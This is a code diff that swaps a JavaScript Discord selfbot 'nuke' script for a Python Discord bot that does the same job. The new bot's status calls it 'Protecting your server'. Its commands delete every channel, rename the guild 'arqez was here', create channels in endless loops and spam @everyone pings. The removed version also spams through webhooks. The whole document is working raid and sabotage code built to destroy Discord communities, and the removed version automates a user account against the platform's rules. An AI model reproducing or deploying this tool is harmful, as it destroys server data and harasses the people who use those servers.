@@ -1,78 +1,105 @@
-const { WebhookClient } = require('discord.js');
-const Discord = require('discord.js-selfbot');
-const input = require('input');
-const axios = require('axios');
-const client = new Discord.Client();
-const PREFIX = '$';
-const escapeRegex = str => str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+import asyncio
+import time
+import logging
+import aiohttp
+import colorama
+import random
+import os
+import requests
+from colorama import Fore, Style, init
+import discord
+from discord import Permissions
+from discord import Webhook, AsyncWebhookAdapter
+from discord.ext import commands, tasks
+from discord.ext.commands import Bot
+from discord.ext.commands import *
+from colorama import Fore as c
+from colorama import Style as S
+import sys
+import json
 
-(async () => {
-	client.on('ready', () => {
-		console.log('ready');
-	});
 
-	client.on('message', async message => {
-		if (message.author.id != client.user.id) return;
-		const prefixRegex = new RegExp(
-			`^(<@!?${client.user.id}>|${escapeRegex(PREFIX)})\\s*`
-		);
-		if (!prefixRegex.test(message.content)) return;
-		const [, matchedPrefix] = message.content.match(prefixRegex);
-		const args = message.content
-			.slice(matchedPrefix.length)
-			.trim()
-			.split(/ +/);
-		const command = args.shift().toLowerCase();
+token = "YOUR_BOTS_TOKEN_HERE"
+bio = ['s!help', 'Protecting your server']
+channel_names = ['arqez was here', "arqez owns you"]
 
-		if (command == 'nuke') {
-			var hooks = [];
-			var joinedArgs = args.join(' ');
-			var name = joinedArgs.split('] [')[0].split('[')[1];
-			var messag = joinedArgs.split('] [')[1].split(']')[0];
-			message.guild.channels.cache.forEach(c => {
-				c.delete();
-			});
-			for (i = 0; i < 2; i++) {
-				message.guild.channels.create(name).then(c => {
-					c.createWebhook(name).then(wh => {
-						hooks.push([wh.id, wh.token]);
-						//console.log([wh.id, wh.token]);
-						//console.log(hooks);
-					});
-					//c.createWebhook(name).then(wh => {
-					//	hooks.push([wh.id, wh.token]);
-					//	console.log([wh.id, wh.token]);
-					//});
+print(f'){Fore.LIGHTMAGENTA_EX}connecting to bot')
+os.system("cls")
 
-					console.log(message.guild.channels.cache.size);
-					if (message.guild.channels.cache.size == 1) {
-						hooks.forEach(wh => {
-							send(messag, wh[0], wh[1], 10);
-							console.log(messag)
-							console.log(wh[0])
-							console.log(wh[1])
-						});
-					}
-				});
-			}
-		}
-	});
-	console.clear();
-	client.login('TokenHere');
-})();
+prefix = "$"
 
-function send(messagg, id, token, count) {
-	console.log('2', messagg, id, token, count);
-	var eee = 0
-	var thing = setInterval(() => {
-	  console.log('looool')
-	  axios.post('https://discord.com/api/webhooks/' + id + '/' + token, {
-	    content: messagg
-	  }).catch(() => {
-	    console.log('o')
-	  })
-	  if (eee == count) {
-	    clearInterval(thing)
-	  }
-	}, (1/2)*1000)
-}
+client = commands.Bot(command_prefix=prefix)
+
+@client.event
+async def on_connect():
+    print(f"{client.user} is online!")
+
+
+@client.event 
+async def on_ready():
+     await client.change_presence(
+         activity=discord.Activity(
+                type=discord.ActivityType.streaming, name=random.choice(bio)))
+
+@client.command(pass_context=True)
+async def nuke(ctx):
+    guild = ctx.message.guild
+    await ctx.message.delete()
+
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print(f"{channel.name} Has been succesfully deleted.")
+        except:
+            pass 
+
+    for i in range (1):
+        try:
+            await ctx.guild.edit(name="arqez was here")
+            print("Name changed.")
+        except:
+            print("Name wasn't changed.")
+
+    for i in range(1):
+        await guild.create_text_channel(random.choice(channel_names))
+        while True:
+            for channel in guild.text_channels:
+                for i in range(500):
+                    await guild.create_text_channel(random.choice(channel_names))
+
+@client.command(pass_context=True)
+async def cdel(ctx):
+    await ctx.message.delete()
+
+    for channel in list(ctx.message.guild.channels):
+        try:
+            await channel.delete()
+            print(f"{channel.name} Has been succesfully deleted.")
+        except:
+            pass 
+
+@client.command(pass_context=True)
+async def ccr(ctx):
+    guild = ctx.message.guild
+    await ctx.message.delete()
+    for i in range(1):
+        await guild.create_text_channel(random.choice(channel_names))
+        while True:
+            for channel in guild.text_channels:
+                for i in range(500):
+                    await guild.create_text_channel(random.choice(channel_names))
+
+@client.command(pass_context=True)
+async def spam(ctx):
+    guild = ctx.message.guild
+    await ctx.message.delete()
+    for i in range(2):
+        print("Spammed channels succesfully.")
+        while True:
+            for channel in guild.text_channels:
+                await channel.send("@everyone <3 https://media.discordapp.net/attachments/741445211242233898/820060221375643648/caption.gif")
+
+
+client.run(token)
+
+
